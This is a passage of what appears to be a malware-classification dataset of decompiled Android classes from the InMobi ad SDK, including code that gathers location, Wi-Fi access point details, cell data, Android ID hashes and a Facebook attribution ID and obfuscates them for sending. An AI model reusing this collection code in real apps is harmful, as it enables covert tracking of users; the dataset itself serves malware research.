getConfig(){     return new ThinICEConfigSettings(b);   }   public static List<Sample> getData(){     LinkedList<Sample> linkedList;     if (BuildSettings.DEBUG) {       Log.d(TAG,""-- getData()"");     } synchronized (j) {       linkedList=h;       flush();     }     return linkedList;   }   public static int getSampleCount(){     int size; synchronized (j) {       size=h.size();     }     return size;   }   public static void setListener(  ThinICEListener thinICEListener){     k=thinICEListener;   }   public static WifiInfo getConnectedWifiInfo(  Context context){     WifiInfo wifiInfo;     int wifiFlags=b.getWifiFlags();     boolean z=!ThinICEConfigSettings.bitTest(wifiFlags,2);     boolean bitTest=ThinICEConfigSettings.bitTest(wifiFlags,1);     if (!b.isSampleConnectedWifiEnabled()) {       return null;     }     try {       if (WifiUtil.hasGetConnectedWifiInfoPermission(context)) {         wifiInfo=WifiUtil.getConnectedWifiInfo(context,z,bitTest);       }  else {         if (BuildSettings.DEBUG) {           Log.w(TAG,""application does not have permission to access connected wifi ap"");         }         wifiInfo=null;       }       return wifiInfo;     }  catch (    Exception e2) {       if (!BuildSettings.DEBUG) {         return null;       }       Log.e(TAG,""Error getting wifi data"",e2);       return null;     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.thinICE.icedatacollector\Sample.code","public final class Sample {   public CellOperatorInfo cellOperator;   public CellTowerInfo connectedCellTowerInfo;   public WifiInfo connectedWifiAp;   public HashMap<String,LocationInfo> lastKnownLocations;   public long utc;   public List<WifiInfo> visibleWifiAp;   public int zoneOffset;   public Sample(){     Calendar calendar=Calendar.getInstance();     this.utc=calendar.getTimeInMillis();     this.zoneOffset=calendar.get(16) + calendar.get(15);   }   public String toString(){     StringBuilder sb=new StringBuilder();     sb.append(getClass().getSimpleName()).append(""[\n"");     sb.append(""-- utc: "").append(this.utc).append(""\n"");     sb.append(""-- zoneOffset: "").append(this.zoneOffset).append(""\n"");     sb.append(""-- cell operator: "").append(this.cellOperator).append(""\n"");     sb.append(""-- connected wifi access point: "").append(this.connectedWifiAp).append(""\n"");     sb.append(""-- last known locations:"");     if (this.lastKnownLocations == null) {       sb.append("" null\n"");     }  else {       sb.append(""\n"");       Iterator<LocationInfo> it=this.lastKnownLocations.values().iterator();       while (it.hasNext()) {         sb.append(""   + "").append(it.next()).append(""\n"");       }     }     sb.append(""-- visible wifi aps:"");     if (this.visibleWifiAp == null) {       sb.append("" null\n"");     }  else {       sb.append(""\n"");       Iterator<WifiInfo> it2=this.visibleWifiAp.iterator();       while (it2.hasNext()) {         sb.append(""   + "").append(it2.next()).append(""\n"");       }     }     sb.append(""-- connected serving cell tower: "").append(this.connectedCellTowerInfo).append(""\n"");     sb.append(""]"");     return sb.toString();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.thinICE.icedatacollector\ThinICEConfigSettings.code","public class ThinICEConfigSettings {   public static final int CELL_OP_FLAG_DISABLE_CURRENT_DETAILS=2;   public static final int CELL_OP_FLAG_DISABLE_SIM_DETAILS=1;   public static final int WIFI_FLAG_DISABLE_NOMAP_EXCLUSION=2;   public static final int WIFI_FLAG_DISABLE_SSID_COLLECTION=1;   private boolean a;   private boolean b;   private boolean c;   private boolean d;   private boolean e;   private boolean f;   private long g;   private long h;   private int i;   private int j;   private int k;   public ThinICEConfigSettings(){     this.a=true;     this.b=true;     this.c=true;     this.d=true;     this.e=true;     this.f=true;     this.g=60000L;     this.h=3000L;     this.i=50;     this.j=0;     this.k=0;   }   public ThinICEConfigSettings(  ThinICEConfigSettings thinICEConfigSettings){     this.a=true;     this.b=true;     this.c=true;     this.d=true;     this.e=true;     this.f=true;     this.g=60000L;     this.h=3000L;     this.i=50;     this.j=0;     this.k=0;     this.a=thinICEConfigSettings.a;     this.b=thinICEConfigSettings.b;     this.c=thinICEConfigSettings.c;     this.d=thinICEConfigSettings.d;     this.e=thinICEConfigSettings.e;     this.f=thinICEConfigSettings.f;     this.g=thinICEConfigSettings.g;     this.h=thinICEConfigSettings.h;     this.i=thinICEConfigSettings.i;     this.j=thinICEConfigSettings.j;     this.k=thinICEConfigSettings.k;   }   public boolean isEnabled(){     return this.a;   }   public ThinICEConfigSettings setEnabled(  boolean z){     this.a=z;     return this;   }   public boolean isSampleCellOperatorEnabled(){     return this.b;   }   public ThinICEConfigSettings setSampleCellOperatorEnabled(  boolean z){     this.b=z;     return this;   }   public boolean isSampleCellEnabled(){     return this.c;   }   public ThinICEConfigSettings setSampleCellEnabled(  boolean z){     this.c=z;     return this;   }   public boolean isSampleConnectedWifiEnabled(){     return this.d;   }   public ThinICEConfigSettings setSampleConnectedWifiEnabled(  boolean z){     this.d=z;     return this;   }   public boolean isSampleLocationEnabled(){     return this.e;   }   public ThinICEConfigSettings setSampleLocationEnabled(  boolean z){     this.e=z;     return this;   }   public boolean isSampleVisibleWifiEnabled(){     return this.f;   }   public ThinICEConfigSettings setSampleVisibleWifiEnabled(  boolean z){     this.f=z;     return this;   }   public long getSampleInterval(){     return this.g;   }   public ThinICEConfigSettings setSampleInterval(  long j){     if (j <= 0) {       throw new IllegalArgumentException(""Sample interval must be greater than 0"");     }     this.g=j;     return this;   }   public long getStopRequestTimeout(){     return this.h;   }   public ThinICEConfigSettings setStopRequestTimeout(  long j){     if (j <= 0) {       throw new IllegalArgumentException(""Stop request timeout must be greater than 0"");     }     this.h=j;     return this;   }   public int getSampleHistorySize(){     return this.i;   }   public ThinICEConfigSettings setSampleHistorySize(  int i){     if (i <= 0) {       throw new IllegalArgumentException(""Sample history size must be greater than 0"");     }     this.i=i;     return this;   }   public int getWifiFlags(){     return this.j;   }   public ThinICEConfigSettings setWifiFlags(  int i){     this.j=i;     return this;   }   public int getCellOpFlags(){     return this.k;   }   public ThinICEConfigSettings setCellOpFlags(  int i){     this.k=i;     return this;   }   public static boolean bitTest(  int i,  int i2){     return (i & i2) == i2;   }   public String toString(){     StringBuilder sb=new StringBuilder();     sb.append(getClass().getSimpleName()).append(""["");     sb.append(""mEnabled="").append(this.a).append("", "");     sb.append(""mSampleCellOperatorEnabled="").append(this.b).append("", "");     sb.append(""mSampleCellEnabled="").append(this.c).append("", "");     sb.append(""mSampleConnectedWifiEnabled="").append(this.d).append("", "");     sb.append(""mSampleLocationEnabled="").append(this.e).append("", "");     sb.append(""mSampleVisibleWifiEnabled="").append(this.f).append("", "");     sb.append(""mSampleInterval="").append(this.g).append("", "");     sb.append(""mStopRequestTimeout="").append(this.h).append("", "");     sb.append(""mWifiFlags="").append(Integer.toBinaryString(this.j)).append("", "");     sb.append(""mCellOpFlags="").append(Integer.toBinaryString(this.k));     sb.append(""]"");     return sb.toString();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.thinICE.icedatacollector\ThinICEListener.code","public interface ThinICEListener {   void onSamplingTerminated(  List<Sample> list); } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.thinICE.location\LocationInfo.code","public final class LocationInfo {   public float accuracy;   public double latitude;   public double longitude;   public String provider;   public long time;   public String toString(){     StringBuilder sb=new StringBuilder();     sb.append(getClass().getSimpleName()).append(""["");     sb.append(""time="").append(this.time).append("", "");     sb.append(""provider="").append(this.provider).append("", "");     sb.append(""latitude="").append(this.latitude).append("", "");     sb.append(""longitude="").append(this.longitude).append("", "");     sb.append(""accuracy="").append(this.accuracy);     sb.append(""]"");     return sb.toString();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.thinICE.location\LocationUtil.code","public final class LocationUtil {   private static LocationInfo a(  Context context,  String str){     Location lastKnownLocation=((LocationManager)context.getSystemService(""location"")).getLastKnownLocation(str);     if (lastKnownLocation == null) {       return null;     }     LocationInfo locationInfo=new LocationInfo();     locationInfo.time=lastKnownLocation.getTime();     locationInfo.provider=lastKnownLocation.getProvider();     locationInfo.latitude=lastKnownLocation.getLatitude();     locationInfo.longitude=lastKnownLocation.getLongitude();     locationInfo.accuracy=lastKnownLocation.getAccuracy();     return locationInfo;   }   public static HashMap<String,LocationInfo> getLastKnownLocations(  Context context){     HashMap<String,LocationInfo> hashMap=new HashMap<>();     if (hasFineLocationPermission(context)) {       hashMap.put(""gps"",a(context,""gps""));     }     if (hasCoarseLocationPermission(context)) {       hashMap.put(""network"",a(context,""network""));     }     return hashMap;   }   public static boolean hasLocationPermission(  Context context){     return hasFineLocationPermission(context) || hasCoarseLocationPermission(context);   }   public static boolean hasFineLocationPermission(  Context context){     return context.checkCallingOrSelfPermission(""android.permission.ACCESS_FINE_LOCATION"") == 0;   }   public static boolean hasCoarseLocationPermission(  Context context){     return context.checkCallingOrSelfPermission(""android.permission.ACCESS_COARSE_LOCATION"") == 0;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.thinICE.wifi\a.code","class a extends BroadcastReceiver {   @Override public void onReceive(  Context context,  Intent intent){     WifiScanListener wifiScanListener;     Context context2;     try {       wifiScanListener=WifiScanner.b;       context2=WifiScanner.a;       WifiManager wifiManager=(WifiManager)context2.getSystemService(""wifi"");       WifiScanner.d();       if (wifiScanListener != null) {         wifiScanListener.onResultsReceived(wifiManager.getScanResults());       }     }  catch (    Exception e) {     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.thinICE.wifi\b.code","class b implements Runnable {   @Override public void run(){     WifiScanListener wifiScanListener;     wifiScanListener=WifiScanner.b;     WifiScanner.d();     if (wifiScanListener != null) {       wifiScanListener.onTimeout();     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.thinICE.wifi\WifiInfo.code","public final class WifiInfo {   public long bssid;   public int ip;   public int rssi;   public String ssid;   public String toString(){     StringBuilder sb=new StringBuilder();     sb.append(getClass().getSimpleName()).append(""["");     sb.append(""bssid="").append(this.bssid).append("", "");     sb.append(""ssid="").append(this.ssid).append("", "");     sb.append(""rssi="").append(this.rssi).append("", "");     sb.append(""ip="").append(String.format(""%d.%d.%d.%d"",Integer.valueOf(this.ip & 255),Integer.valueOf((this.ip >> 8) & 255),Integer.valueOf((this.ip >> 16) & 255),Integer.valueOf((this.ip >> 24) & 255)));     sb.append(""]"");     return sb.toString();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.thinICE.wifi\WifiScanListener.code","public interface WifiScanListener {   void onResultsReceived(  List<ScanResult> list);   void onTimeout(); } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.thinICE.wifi\WifiScanner.code","public final class WifiScanner {   private static Context a=null;   private static WifiScanListener b=null;   private static Handler c=null;   private static boolean d=false;   private static Runnable e=new b();   private static boolean f=false;   private static final BroadcastReceiver g=new a();   private static final IntentFilter h=new IntentFilter(""android.net.wifi.SCAN_RESULTS"");   private static PowerManager.WakeLock i=null;   private static WifiManager.WifiLock j=null;   public static boolean requestScan(  Context context,  WifiScanListener wifiScanListener){     return requestScan(Looper.myLooper(),context,wifiScanListener,10000L,false);   }   public static synchronized boolean requestScan(  Looper looper,  Context context,  WifiScanListener wifiScanListener,  long j2,  boolean z){     boolean startScan; synchronized (WifiScanner.class) {       if (c != null) {         startScan=false;       }  else {         WifiManager wifiManager=(WifiManager)context.getSystemService(""wifi"");         if (wifiManager.isWifiEnabled()) {           a=context;           b=wifiScanListener;           d=z;           c=new Handler(looper);           c.postDelayed(e,j2);           if (d) {             i();             g();           }           e();           startScan=wifiManager.startScan();         }  else {           startScan=false;         }       }     }     return startScan;   }   public static synchronized void d(){ synchronized (WifiScanner.class) {       if (c != null) {         c.removeCallbacks(e);         f();         if (d) {           h();           j();         }         c=null;         b=null;         a=null;         d=false;       }     }   }   private static void e(){     if (!f) {       f=true;       a.registerReceiver(g,h,null,c);     }   }   private static void f(){     if (f) {       f=false;       try {         a.unregisterReceiver(g);       }  catch (      IllegalArgumentException e2) {       }     }   }   private static void g(){     if (i == null) {       i=((PowerManager)a.getSystemService(""power"")).newWakeLock(1,""wifiscanrequester.CpuLock"");       i.setReferenceCounted(false);     }     if (!i.isHeld()) {       i.acquire();     }   }   private static void h(){     if (i != null) {       if (i.isHeld()) {         i.release();       }       i=null;     }   }   private static void i(){     if (j == null) {       j=((WifiManager)a.getSystemService(""wifi"")).createWifiLock(2,""wifiscanrequester.WiFiScanLock"");       j.setReferenceCounted(false);     }     if (!j.isHeld()) {       j.acquire();     }   }   private static void j(){     if (j != null) {       if (j.isHeld()) {         j.release();       }       j=null;     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.thinICE.wifi\WifiUtil.code","public final class WifiUtil {   private static final String[] a={""android.permission.ACCESS_WIFI_STATE""};   private static final String[] b={""android.permission.ACCESS_WIFI_STATE"",""android.permission.CHANGE_WIFI_STATE""};   private static final String[] c={""android.permission.WAKE_LOCK""};   public static WifiInfo getConnectedWifiInfo(  Context context,  boolean z,  boolean z2){     android.net.wifi.WifiInfo connectionInfo=((WifiManager)context.getSystemService(""wifi"")).getConnectionInfo();     if (connectionInfo == null) {       return null;     }     WifiInfo wifiInfo=new WifiInfo();     String bssid=connectionInfo.getBSSID();     String ssid=connectionInfo.getSSID();     if (bssid == null || a(z,ssid)) {       return null;     }     wifiInfo.bssid=macToLong(bssid);     if (z2) {       ssid=null;     }     wifiInfo.ssid=ssid;     wifiInfo.rssi=connectionInfo.getRssi();     wifiInfo.ip=connectionInfo.getIpAddress();     return wifiInfo;   }   public static WifiInfo getConnectedWifiInfo(  Context context){     int wifiFlags=IceDataCollector.getConfig().getWifiFlags();     return getConnectedWifiInfo(context,!ThinICEConfigSettings.bitTest(wifiFlags,2),ThinICEConfigSettings.bitTest(wifiFlags,1));   }   public static boolean hasGetConnectedWifiInfoPermission(  Context context){     for (    String str : a) {       if (context.checkCallingOrSelfPermission(str) != 0) {         return false;       }     }     return true;   }   public static boolean hasWifiScanPermission(  Context context,  boolean z){     for (    String str : b) {       if (context.checkCallingOrSelfPermission(str) != 0) {         return false;       }     }     if (z) {       for (      String str2 : c) {         if (context.checkCallingOrSelfPermission(str2) != 0) {           return false;         }       }     }     return true;   }   public static List<WifiInfo> scanResultsToWifiInfos(  List<ScanResult> list,  boolean z,  boolean z2){     if (list == null) {       return null;     }     ArrayList arrayList=new ArrayList();     for (    ScanResult scanResult : list) {       if (!a(z,scanResult.SSID)) {         arrayList.add(scanResultToWifiInfo(scanResult,z2));       }     }     return arrayList;   }   private static boolean a(  boolean z,  String str){     return z && str != null && str.endsWith(""_nomap"");   }   public static WifiInfo scanResultToWifiInfo(  ScanResult scanResult,  boolean z){     if (scanResult == null) {       return null;     }     WifiInfo wifiInfo=new WifiInfo();     wifiInfo.bssid=macToLong(scanResult.BSSID);     wifiInfo.ssid=z ? null : scanResult.SSID;     wifiInfo.rssi=scanResult.level;     return wifiInfo;   }   public static long macToLong(  String str){     String[] split=str.split(""\\:"");     byte[] bArr=new byte[6];     for (int i=0; i < 6; i++) {       bArr[i]=(byte)Integer.parseInt(split[i],16);     }     return a(bArr);   }   private static long a(  byte[] bArr){     if (bArr == null || bArr.length != 6) {       return 0L;     }     return a(bArr[5]) | (a(bArr[4]) << 8) | (a(bArr[3]) << 16)| (a(bArr[2]) << 24)| (a(bArr[1]) << 32)| (a(bArr[0]) << 40);   }   private static long a(  byte b2){     return b2 & 255;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.thirdparty\a.code","public static class a extends b {   private static final int[] c={-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,62,-1,-1,-1,63,52,53,54,55,56,57,58,59,60,61,-1,-1,-1,-2,-1,-1,-1,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,-1,-1,-1,-1,-1,-1,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1};   private static final int[] d={-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,62,-1,-1,52,53,54,55,56,57,58,59,60,61,-1,-1,-1,-2,-1,-1,-1,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,-1,-1,-1,-1,63,-1,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1};   private int e;   private int f;   private final int[] g;   public a(  int i,  byte[] bArr){     this.a=bArr;     this.g=(i & 8) == 0 ? c : d;     this.e=0;     this.f=0;   }   public boolean a(  byte[] r11,  int r12,  int r13,  boolean r14){     throw new UnsupportedOperationException(""Method not decompiled: com.inmobi.commons.thirdparty.Base64.a.a(byte[], int, int, boolean):boolean"");   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.thirdparty\b.code","public static abstract class b {   public byte[] a;   public int b;   b(){   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.thirdparty\Base62.code","public class Base62 {   public static final String ALPHABET=""0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"";   public static final int BASE=ALPHABET.length();   private Base62(){   }   public static String fromBase10(  long j){     try {       StringBuilder sb=new StringBuilder("""");       while (j > 0) {         j=a(j,sb);       }       return sb.reverse().toString();     }  catch (    Exception e) {       Log.internal(InternalSDKUtil.LOGGING_TAG,""Failed to convert to base 62"",e);       return null;     }   }   private static long a(  long j,  StringBuilder sb){     sb.append(ALPHABET.charAt((int)(j % BASE)));     return j / BASE;   }   public static int toBase10(  String str){     return a(new StringBuilder(str).reverse().toString().toCharArray());   }   private static int a(  char[] cArr){     int i=0;     for (int length=cArr.length - 1; length >= 0; length--) {       i+=a(ALPHABET.indexOf(cArr[length]),length);     }     return i;   }   private static int a(  int i,  int i2){     return ((int)Math.pow(BASE,i2)) * i;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.thirdparty\Base64.code","!org.eclipse.jdt.core.dom.TypeDeclaration@5794ee41"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.thirdparty\c.code","!org.eclipse.jdt.core.dom.TypeDeclaration@2ffdb97f"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.uid\UID.code","public class UID {   public static final String FACEBOOK_ID=""FBA"";   public static final boolean FBA_DEF=false;   public static final boolean LID_DEF=true;   public static final String LOGIN_ID=""LID"";   public static final boolean LTVE_DEF=true;   public static final String LTV_ID=""LTVID"";   public static final String LTV_ID_ENABLE=""LTVID"";   public static final boolean O1_DEF=true;   public static final String ODIN1=""O1"";   public static final String SESSION_ID=""SID"";   public static final boolean SID_DEF=true;   public static final boolean UM5_DEF=true;   public static final String UM5_ID=""UM5"";   private static UID a=new UID();   private boolean b;   private boolean c;   private boolean d;   private boolean e;   private boolean f;   private boolean g;   public static UID getCommonsUid(){     return a;   }   public boolean isO1(){     return this.b;   }   public boolean isSid(){     return this.c;   }   public boolean isLid(){     return this.d;   }   public boolean isFba(){     return this.e;   }   public boolean isUm5(){     return this.f;   }   public boolean isLtve(){     return this.g;   }   public String getUidMap(  int i,  String str,  Map<String,String> map){     try {       InternalSDKUtil.initialize(InternalSDKUtil.getContext());     }  catch (    Exception e) {       Log.internal(InternalSDKUtil.PRODUCT_COMMONS,""Unable to initialize commons."");     }     return getDefaultUidMap(i,str,map);   }   public String getDefaultUidMap(  int i,  String str,  Map<String,String> map){     Map<String,String> a2=a(i,str);     if (map != null) {       for (      String str2 : map.keySet()) {         String str3=map.get(str2);         if (str3 != null) {           a2.put(str2,UIDHelper.a(str3,str));         }       }     }     return UIDUtil.getEncryptedJSON(a2);   }   private Map<String,String> a(  int i,  String str){     String fBId;     Long lTVId;     String iDType;     String iDType2;     String fBId2;     int deviceIDMask=UserInfo.getInstance().getDeviceIDMask();     Context context=InternalSDKUtil.getContext();     HashMap hashMap=new HashMap();     if (deviceIDMask <= 0) {       if (this.b && a.b) {         hashMap.put(ODIN1,UIDHelper.a(UIDHelper.getODIN1(UIDHelper.getAndroidId(context)),str));       }       if (this.e && a.e && (fBId2=UIDHelper.getFBId(context)) != null) {         hashMap.put(FACEBOOK_ID,UIDHelper.a(fBId2,str));       }       if (this.f && a.f) {         hashMap.put(UM5_ID,UIDHelper.a(UIDHelper.getUM5(UIDHelper.getAndroidId(context)),str));       }     }  else {       if ((deviceIDMask & 2) != 2 && this.b && a.b) {         hashMap.put(ODIN1,UIDHelper.a(UIDHelper.getODIN1(UIDHelper.getAndroidId(context)),str));       }       if ((deviceIDMask & 4) != 4 && this.e && a.e && (fBId=UIDHelper.getFBId(context)) != null) {         hashMap.put(FACEBOOK_ID,UIDHelper.a(fBId,str));       }       if ((deviceIDMask & 8) != 8 && this.f && a.f) {         hashMap.put(UM5_ID,UIDHelper.a(UIDHelper.getUM5(UIDHelper.getAndroidId(context)),str));       }     }     if (this.d && a.d && (iDType2=UserInfo.getInstance().getIDType(IMIDType.ID_LOGIN)) != null) {       hashMap.put(LOGIN_ID,UIDHelper.a(iDType2,str));     }     if (this.c && a.c && (iDType=UserInfo.getInstance().getIDType(IMIDType.ID_SESSION)) != null) {       hashMap.put(SESSION_ID,UIDHelper.a(iDType,str));     }     if (this.g && a.g && (lTVId=AnalyticsInitializer.getRawConfigParams().getLTVId()) != null) {       hashMap.put(""LTVID"",UIDHelper.a(lTVId + """",str));     }     return hashMap;   }   public UID(){     this.b=true;     this.c=true;     this.d=true;     this.e=false;     this.f=true;     this.g=true;   }   public UID(  Context context,  Map<String,Object> map){     this(context);     setFromMap(map);   }   public UID(  Context context){     this.b=true;     this.c=true;     this.d=true;     this.e=false;     this.f=true;     this.g=true;     InternalSDKUtil.setContext(context);   }   public UID(  Map<String,Object> map){     this.b=true;     this.c=true;     this.d=true;     this.e=false;     this.f=true;     this.g=true;     setFromMap(map);   }   public final void setFromMap(  Map<String,Object> map){     this.b=InternalSDKUtil.getBooleanFromMap(map,ODIN1);     this.c=InternalSDKUtil.getBooleanFromMap(map,SESSION_ID);     this.d=InternalSDKUtil.getBooleanFromMap(map,LOGIN_ID);     this.e=InternalSDKUtil.getBooleanFromMap(map,FACEBOOK_ID);     this.f=InternalSDKUtil.getBooleanFromMap(map,UM5_ID);     this.g=InternalSDKUtil.getBooleanFromMap(map,""LTVID"");   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.uid\UIDHelper.code","public class UIDHelper {   private static final Uri a=Uri.parse(""content://com.facebook.katana.provider.AttributionIdProvider"");   private static String b=null;   public static String getAppId(){     return b;   }   public static void setAppId(  String str){     b=str;   }   public static String byteToHex(  byte b2){     try {       char[] cArr={'0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f'};       return new String(new char[]{cArr[(b2 >> 4) & 15],cArr[b2 & 15]});     }  catch (    Exception e) {       return null;     }   }   public static String getRSAKeyVersion(){     return ""1"";   }   public static String getODIN1(  String str){     return b(str,""SHA-1"");   }   private static String b(  String str,  String str2){     if (str != null) {       try {         if (!"""".equals(str.trim())) {           MessageDigest messageDigest=MessageDigest.getInstance(str2);           messageDigest.update(str.getBytes());           byte[] digest=messageDigest.digest();           StringBuffer stringBuffer=new StringBuffer();           for (          byte b2 : digest) {             stringBuffer.append(Integer.toString((b2 & 255) + a.ACTION_NEXT_AT_MOVEMENT_GRANULARITY,16).substring(1));           }           return stringBuffer.toString();         }       }  catch (      Exception e) {         Log.debug(InternalSDKUtil.LOGGING_TAG,""Exception in getting ODIN-1"",e);         return null;       }     }     return ""TEST_EMULATOR"";   }   public static String getUM5(  String str){     return b(str,""MD5"");   }   public static String getFBId(  Context context){     try {       Cursor query=context.getContentResolver().query(a,new String[]{""aid""},null,null,null);       if (query == null || !query.moveToFirst()) {         return null;       }       String string=query.getString(query.getColumnIndex(""aid""));       if (string != null) {         if (string.length() != 0) {           return string;         }       }       return null;     }  catch (    Exception e) {       Log.internal(InternalSDKUtil.LOGGING_TAG,""Unable to retrieve Facebook attrib id: "" + e);       return null;     }   }   public static String a(  String str,  String str2){     try {       byte[] bytes=str.getBytes(""UTF-8"");       byte[] bArr=new byte[bytes.length];       byte[] bytes2=str2.getBytes(""UTF-8"");       for (int i=0; i < bytes.length; i++) {         bArr[i]=(byte)(bytes[i] ^ bytes2[i % bytes2.length]);       }       return new String(Base64.encode(bArr,2),""UTF-8"");     }  catch (    Exception e) {       Log.debug(InternalSDKUtil.LOGGING_TAG,""Exception in xor with random integer"",e);       return """";     }   }   public static String encryptRSA(  String str){     if (str == null || """".equals(str)) {       return null;     }     try {       RSAPublicKey rSAPublicKey=(RSAPublicKey)KeyFactory.getInstance(""RSA"").generatePublic(new RSAPublicKeySpec(new BigInteger(""C10F7968CFE2C76AC6F0650C877806D4514DE58FC239592D2385BCE5609A84B2A0FBDAF29B05505EAD1FDFEF3D7209ACBF34B5D0A806DF18147EA9C0337D6B5B"",16),new BigInteger(""010001"",16)));       Cipher cipher=Cipher.getInstance(""RSA/ECB/nopadding"");       cipher.init(1,rSAPublicKey);       return new String(Base64.encode(a(str.getBytes(""UTF-8""),1,cipher),0));     }  catch (    Exception e) {       Log.debug(InternalSDKUtil.LOGGING_TAG,""Exception in encryptRSA"",e);       return null;     }   }   private static byte[] a(  byte[] bArr,  int i,  Cipher cipher) throws IllegalBlockSizeException, BadPaddingException {     byte[] bArr2=new byte[0];     byte[] bArr3=new byte[0];     if (i == 1) {     }     int length=bArr.length;     byte[] bArr4=new byte[64];     byte[] bArr5=bArr3;     for (int i2=0; i2 < length; i2++) {       if (i2 > 0 && i2 % 64 == 0) {         bArr5=a(bArr5,cipher.doFinal(bArr4));         bArr4=new byte[i2 + 64 > length ? length - i2 : 64];       }       bArr4[i2 % 64]=bArr[i2];     }     return a(bArr5,cipher.doFinal(bArr4));   }   private static byte[] a(  byte[] bArr,  byte[] bArr2){     byte[] bArr3=new byte[bArr.length + bArr2.length];     System.arraycopy(bArr,0,bArr3,0,bArr.length);     System.arraycopy(bArr2,0,bArr3,bArr.length,bArr2.length);     return bArr3;   }   public static String getAndroidId(  Context context){     String str=null;     try {       str=Settings.Secure.getString(context.getContentResolver(),""android_id"");     }  catch (    Exception e) {       Log.internal(InternalSDKUtil.PRODUCT_COMMONS,""Unable to retrieve android id."");     }     if (str == null) {       try {         return Settings.System.getString(context.getContentResolver(),""android_id"");       }  catch (      Exception e2) {         Log.internal(InternalSDKUtil.PRODUCT_COMMONS,""Unable to retrieve android id."");         return str;       }     }     return str;   } } "
